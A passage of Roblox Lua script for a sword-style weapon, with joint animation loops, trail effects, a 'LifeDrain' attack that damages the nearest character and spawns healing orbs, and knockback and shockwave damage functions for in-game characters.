  w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(180-180*i), math.rad(90)) * CFrame.new(0, 0, 0.2)
  if FTCount <= MaxFT then
  local eff = effect("Bright red",0.2,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0),true)
  eff.Transparency = 1
  table.insert(efftab,eff)
  FTCount = FTCount + 1
  OTND(eff)
 coroutine.resume(coroutine.create(function()
 for i = 0 , 1 , 0.15 do 
 wait()
 eff.Transparency = 1-0.5*i
 end 
 wait()
 eff.Transparency = 0.5
 end))
 end
     end 
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(0), math.rad(90)) * CFrame.new(0, 0, 0.2)
 for i = 0 , 1 , 0.2 do
                wait()
  local rndmd = rndmdec1-rndmdec1*i
  RW.C0 = CFrame.new(0,0.5,-1) * CFrame.fromEulerAnglesXYZ(math.rad((90-rndmd)), math.rad(90), math.rad((10-(rndmd*2))-20*i))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(-90-10*i), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-0.5,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80),math.rad(-45),math.rad(45))
  w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(0), math.rad(90)) * CFrame.new(0, 0, 0.2)
  end 
 for i = 0 , 1 , 0.1 do
                wait()
  RW.C0 = CFrame.new(1*i,0.5,-1) * CFrame.fromEulerAnglesXYZ(math.rad(90-20*i), math.rad(90-90*i), math.rad(-10-35*i))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(-100+100*i), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-0.5-0.5*i,0.5,-0.5-0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(80-10*i),math.rad(-45+45*i),math.rad(45))
  w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(180*i), math.rad(90-45*i)) * CFrame.new(0, 0, 0.2)
  end 
 ss(Head,1.5)
 fs(Head,0.5+1.5*math.random())
 wait(0.1)
 Hitdeb = 0
 for i = 0 , 1 , 0.2 do
  LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
                wait()
  RW.C0 = CFrame.new(1,0.5+1*i,-1) * CFrame.fromEulerAnglesXYZ(math.rad(70+65*i), math.rad(0), math.rad(-45))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1,0.5+1*i,-1) * CFrame.fromEulerAnglesXYZ(math.rad(70+65*i),math.rad(0),math.rad(45))
  w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(180-180*i), math.rad(45)) * CFrame.new(0, 0, 0.2)
  if FTCount <= MaxFT then
  local eff = effect("Bright red",0.2,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0),true)
  eff.Transparency = 1
  table.insert(efftab,eff)
  FTCount = FTCount + 1
  OTND(eff)
 coroutine.resume(coroutine.create(function()
 for i = 0 , 1 , 0.15 do 
 wait()
 eff.Transparency = 1-0.5*i
 end 
 wait()
 eff.Transparency = 0.5
 end))
 end
  end 
 coroutine.resume(coroutine.create(function()
 wait(5)
 for _,eff in pairs(efftab) do
 wait()
 eff.Parent = nil
 FTCount = FTCount - 1
 end end))
 for i = 0 , 1 , 0.1 do
                wait()
  RW.C0 = CFrame.new(1,1.5-1*i,-1+0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(135-55*i), math.rad(45*i), math.rad(-45))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1,1.5-1*i,-1+0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(135-55*i),math.rad(-45*i),math.rad(45))
  w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(0), math.rad(45+45*i)) * CFrame.new(0, 0, 0.2)
   end 
 dmgdc()
 attack=false
end
 
 
function LifeDrain()
attack=true
 for i = 0 , 1 , 0.1 do
                wait()
  RW.C0 = CFrame.new(1,0.5,-0.5+0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(80+55*i), math.rad(45), math.rad(-45+90*i))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(90*i), math.rad(0))
  LW.C0 = CFrame.new(-1+1.25*i,0.5+0.25*i,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80+25*i),math.rad(-45+90*i),math.rad(45+25*i))
  LW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(90*i), math.rad(0))
  w1.C1 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0, 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(0), math.rad(90)) * CFrame.new(0, 0, 0.2)
     end 
------
local nrmag = 50
local nrprsn = nil
wait() 
--
local c = game.Workspace:GetChildren(); 
for i = 1, #c do 
local hum = c[i]:findFirstChild("Humanoid") 
if hum ~= nil and hum.Health ~= 0 then 
local head = c[i]:findFirstChild("Torso"); 
if head ~= nil then 
local targ = head.Position - Torso.Position; 
local mag = targ.magnitude; 
if mag <= 50 and c[i].Name ~= Player.Name then 
if mag < nrmag then
nrmag = mag
nrprsn = c[i]
end
end end end end
--
if nrprsn == nil then 
attack = false     
return end
local C = 0
local bp = Instance.new("BodyPosition")
local bg = Instance.new("BodyGyro")
bp.Parent = Torso
bp.maxForce = Vector3.new(math.huge,math.huge,math.huge)
bp.P = bp.P + 10000
local CF = nrprsn.Torso.CFrame
bp.position = CF.p + CFrame.new(Torso.Position,CF.p).lookVector * -3
bg.Parent = Torso
bg.maxTorque = Vector3.new(math.huge,math.huge,math.huge)
bg.P = bg.P + 100000
bg.cframe = CFrame.new(Torso.Position,CF.p) * CFrame.Angles(math.rad(0),0,0)
ss(Head,2)
wait(0.1)
local FirstP = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
local LastP = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
 for i = 0 , 1 , 0.2 do
                wait()
  C = C + 1
  RW.C0 = CFrame.new(1-1*i,0.5,-1*i) * CFrame.fromEulerAnglesXYZ(math.rad(135-90*i), math.rad(45), math.rad(45-135*i))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(90), math.rad(0))
  LW.C0 = CFrame.new(0.25-1.75*i,0.75-0.25*i,-0.5+0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(105-60*i),math.rad(45),math.rad(70-125*i))
  LW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(90), math.rad(0))
  w1.C1 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0, 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(90*i), math.rad(90)) * CFrame.new(0, 0, 0.2)
  if C == 3 then
  bp.P = bp.P + 10000
bp.position = CF.p + CFrame.new(Torso.Position,CF.p).lookVector * 6
bg.cframe = CFrame.new(Torso.Position,CF.p) * CFrame.Angles(math.rad(-45),0,0)
  end
  if C == 2 then
  FirstP = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
  elseif C == 5 then
  LastP = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
  end
     end 
local effectsmsh = Instance.new("SpecialMesh")
effectsmsh.Scale = Vector3.new(5,1,5)
effectsmsh.MeshType = "Sphere"
local effectsg = Instance.new("Part")
effectsg.formFactor = 3
effectsg.CanCollide = false
effectsg.Name = "Eff"
effectsg.Locked = true
effectsg.Anchored = true
effectsg.Size = Vector3.new(0.2,1,0.2)
effectsg.Parent = swordholder
effectsmsh.Parent = effectsg
effectsg.BrickColor = BrickColor.new("White")
effectsg.Reflectance = Ref
local point1 = FirstP
local LP = LastP
local mg = (LP.p - point1.p).magnitude
effectsg.Size = Vector3.new(0.2,mg,0.2)
effectsg.CFrame = CFrame.new((LP.p+point1.p)/2,point1.p) * CFrame.Angles(math.rad(90),0,0)
if returnn then return effectsg end
coroutine.resume(coroutine.create(function()
if not returnn then
for i = 0 , 1 , 0.1 do
wait()
effectsg.Transparency = 1*i
end
wait()
effectsg.Parent = nil
end
end))
local critrandomizer = math.random(1,crtrate)
local rndmdamage = 0
if critrandomizer ~= 1 then
rndmdamage = math.random(mindamage,maxdamage)
damagesplat(rndmdamage,nrprsn.Head,false)
nrprsn.Humanoid:TakeDamage(rndmdamage)
elseif critrandomizer == 1 then
rndmdamage = math.random(maxdamage,crtmaxdamage)
damagesplat(rndmdamage,nrprsn.Head,true)
nrprsn.Humanoid:TakeDamage(rndmdamage)
end
local tempmod = Instance.new("Model",Workspace)
for l = 1 , rndmdamage/5 do
local meshz = Instance.new("SpecialMesh")
meshz.Scale = Vector3.new(1.5,1.5,1.5)
meshz.MeshType = "Sphere"
local shellz = Instance.new("Part")
meshz.Parent = shellz
shellz.Anchored = false
shellz.formFactor = 0
shellz.Size = Vector3.new(1,1,1)
shellz.CFrame = hitbox.CFrame
shellz.Parent = tempmod
shellz.Transparency = 0.5
shellz.BrickColor = BrickColor.new("White")
shellz.CanCollide = false
shellz.Reflectance = 0
local bv = Instance.new("BodyPosition") 
bv.Parent = shellz
bv.maxForce = Vector3.new(math.huge,math.huge,math.huge) 
bv.P = bv.P + 10000
bv.position = shellz.Position + Vector3.new(math.random(-25,25),math.random(-2.5,7.5),math.random(-25,25))
coroutine.resume(coroutine.create(function()
wait(3)
bv.maxForce = Vector3.new(0,math.huge,0) 
coroutine.resume(coroutine.create(function() 
local dd = false
while shellz.Transparency ~= 1 and not dd do
wait(0.1) 
local cc = game.Workspace:GetChildren(); 
for i = 1, #c do 
local hum = cc[i]:findFirstChild("Humanoid") 
if hum ~= nil and hum.Health ~= 0 then 
local head = cc[i]:findFirstChild("Head"); 
if head ~= nil then 
local targ = head.Position - shellz.Position; 
local mag = targ.magnitude; 
if mag <= 5 then 
dd = true
damagesplat(5+darkboost,head,false)
hum.Health = hum.Health + 5 + darkboost
for i = 0 , 1 , 0.05 do
wait()
shellz.Transparency = 1*i
end
shellz.Parent = nil
end 
end 
end 
end 
end 
end)) 
 
end))
local hx = false
coroutine.resume(coroutine.create(function()
for i = 0 , 1 , 0.05 do
wait()
shellz.Transparency = 1-1*i
end
shellz.Transparency = 0
end))
coroutine.resume(coroutine.create(function()
wait(60)
for ii,shellz in pairs(tempmod:GetChildren()) do
for i = 0 , 1 , 0.1 do
wait()
shellz.Transparency = 1*i
end
shellz.Parent = nil
end
tempmod.Parent = nil
end))
end
wait(0.5)
----
  RW.C0 = CFrame.new(1,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80), math.rad(45), math.rad(-45))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80),math.rad(-45),math.rad(45))
  LW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
  w1.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(0), math.rad(90)) * CFrame.new(0, 0, 0.2)
 attack=false
bp.Parent = nil bg.Parent = nil
end
 
 
--TEST
 
hammer = Torso
 
function doDamage(hit)
 local humanoid = hit.Parent:findFirstChild("Humanoid")
 local hum = Player.Character:findFirstChild("Humanoid") -- non-nil if tool held by a character
 if humanoid~=nil and humanoid ~= hum and hum ~= nil then
  local foundd = false
  for ii = 1 , #AoETrue do
  if AoETrue[ii] == hit.Parent.Name then
  foundd = true
  end
  end
  if foundd then
  end
  --
  if not foundd then
  humanoid:TakeDamage(5)
  if Mode == "Fire" then
  end
  damagesplat(5,humanoid.Parent.Torso,false)
  table.insert(AoETrue,hit.Parent)
  end
 
  if humanoid.Health <= 0 then
   local c = hit.CFrame
   hit.CFrame = CFrame.new(hit.Position)
   hit.CFrame = c
  end
  delay(1, function() end)
 else
  local c = hit.CFrame hit.CFrame = CFrame.new(hit.Position) hit.CFrame = c
 end
end
function bewm(obj, pos, notme)
 if (obj ~= notme) then
  if (obj.className == "Part") or (obj.className == "Seat") then
   if (not obj.Anchored) and (((pos - obj.Position) * Vector3.new(1, 0, 1)).magnitude < 24) and (pos.y <= obj.Position.y + 2) and (pos.y >= obj.Position.y - 2) then
    delay((pos - obj.Position).magnitude / 24, function() obj.Velocity = ((obj.Position - pos).unit + Vector3.new(0, 0.5, 0)) * 96 + obj.Velocity obj.RotVelocity = obj.RotVelocity + Vector3.new(obj.Position.z - pos.z, 0, pos.x - obj.Position.x).unit * 40 doDamage(obj)    end)
   end
  elseif (obj.className == "Model") or (obj.className == "Hat") or (obj.className == "Tool") or (obj == workspace) then
   local list = obj:GetChildren()
   for x = 1, #list do
    bewm(list[x], pos, notme)
   end
  end
 end
end
 
function attackr()
local shockRing = Instance.new("Part")
shockRing.formFactor = 2
shockRing.Size = Vector3.new(1, 0.4, 1)
shockRing.Anchored = true
shockRing.Locked = true
shockRing.CanCollide = false
shockRing.arch